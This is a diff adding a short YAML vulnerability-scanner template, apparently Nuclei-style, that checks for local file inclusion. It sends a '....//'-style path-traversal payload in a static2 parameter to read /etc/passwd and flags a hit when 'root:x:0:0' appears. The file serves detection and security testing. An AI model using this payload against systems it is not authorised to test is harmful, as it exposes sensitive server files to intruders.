@@ -1,0 +1,20 @@
+id: lfi6-0968
+name: 'Traversal in static2'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via static2'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      static2:
+        - '....//....//....//....//....//....//etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
